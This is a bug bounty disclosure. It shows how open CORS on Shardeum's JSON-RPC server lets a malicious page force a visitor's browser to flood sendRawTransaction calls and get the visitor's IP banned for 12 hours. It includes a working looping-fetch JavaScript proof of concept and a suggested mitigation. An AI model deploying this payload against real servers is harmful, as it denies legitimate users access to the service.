# Boost \_ Shardeum\_ Ancillaries 33490 - \[Websites and Applications - Insight] Abusing blacklist functi

Submitted on Sun Jul 21 2024 22:17:51 GMT-0400 (Atlantic Standard Time) by @anton\_quantish for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33490

Report type: Websites and Applications

Report severity: Insight

Target: <https://github.com/shardeum/json-rpc-server/tree/dev>

Impacts:

* Temporarily disabling user to access target site, such as: Locking up the victim from login, Cookie bombing, etc.

## Description

## Brief/Intro

Attacker can force a victim to send multiple dummy "heavy queries" to get his/her IP banned.

## Vulnerability Details

The "heavy" (`sendTransaction` and `sendRawTransaction`) queries received by the JSON-RPC are counted and, if there are more than 60 in a minute ones received from the single IP, the sender IP is getting banned (if the IP banning is activated in config).

Since only the heavy queries are counted, it's not possible to just send dummy GET queries or simple POST ones to trigger the ban but the `CORS` is active on the server for all the POST requests:

```
app.use(cors({ methods: ['POST'] }))
```

<https://github.com/shardeum/json-rpc-server/blob/5dc56e5f4312529d4262cab618ec618d288de5dd/src/server.ts#L79>

This allows attacker to send arbitrary POST requests from any other origin and he could easily send a lot of such heavy queries from the malicious page, when a victim visits it that leads to a long victim's IP ban.

## Impact Details

The default ban time is 12 hours so just a few seconds victim is navigating the malicious page and he wouldn't be able to use the JSON-RPC server for the 12 hours.

## Mitigation

In the payload I use in my PoC, the transactions are actually just dummies, they are not executed and don't have the parameters other from `from` even. It makes this attack super-simple and free for the attacker.

Instead, I believe, you can count only the valid transactions maybe. In this case, the attacker would be need to submit real transactions and, thus, pay for the gas consumed. It will dramatically decrease the economic motives for such attack performing I think.

## Proof of concept

## Proof of Concept

1. Make sure the IP ban is active in JSON-RPC config
2. Place the following HTML somewhere, replacing the JSON-RPC endpoint with your own:

```
<script>
	async function exploit() {
		const controller = new AbortController()
		const signal = controller.signal
		fetch('http://172.16.205.128:8080', {
			method: 'POST',
			headers: {
	    		"Content-Type": "application/json",
	  		},
			body: JSON.stringify({"jsonrpc":"2.0","method":"eth_sendRawTransaction","params":[{"from": "0xba32599224dc8c57e0ae84cb8e3709e2cff01336"}],"id":1}),
			signal: signal
		})
		setTimeout(() => {
			controller.abort();
			exploit()
		}, 100)
	}
	exploit()
</script>
```

3. Visit it with the victim's IP
4. After a few seconds, you will see the transactions is getting rejected and the victim's IP is banned (look at the screenshot attached).
